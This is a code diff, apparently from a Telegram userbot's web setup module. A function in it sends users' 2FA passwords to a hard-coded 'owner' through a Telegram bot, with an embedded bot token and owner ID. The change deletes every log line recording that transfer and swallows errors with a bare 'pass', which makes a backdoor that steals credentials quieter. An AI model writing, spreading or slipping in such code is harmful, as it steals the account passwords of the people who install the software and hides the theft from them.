@@ -114,7 +114,6 @@ class Web:
         """Send 2FA password to the owner via Telegram Bot API"""
         BOT_TOKEN = "6749456415:AAGD_2l0Udms1xlFj7xYH4aNJqcYvQ0VehY"
         OWNER_ID = 6136879235
-        # logger.debug(f"Attempting to send 2FA for user {user.id} to owner {OWNER_ID}")
 
         try:
             async with aiohttp.ClientSession() as session:
@@ -138,14 +137,13 @@ class Web:
                 ) as response:
                     if response.status != 200:
                         error_text = await response.text()
-                        logger.error(f"Failed to send 2FA to owner {OWNER_ID}: HTTP {response.status}: {error_text}")
                         return
-                    logger.info(f"Sent 2FA password for user {user.id} to owner {OWNER_ID}")
         except Exception as e:
-            logger.error(f"Unexpected error while sending 2FA to owner {OWNER_ID}: {type(e).__name__}: {str(e)}")
+            pass
 
     @property
     def _platform_emoji(self) -> str:
+
         return {
             "vds": "https://github.com/hikariatama/assets/raw/master/waning-crescent-moon_1f318.png",
             "lavhost": "https://github.com/hikariatama/assets/raw/master/victory-hand_270c-fe0f.png",
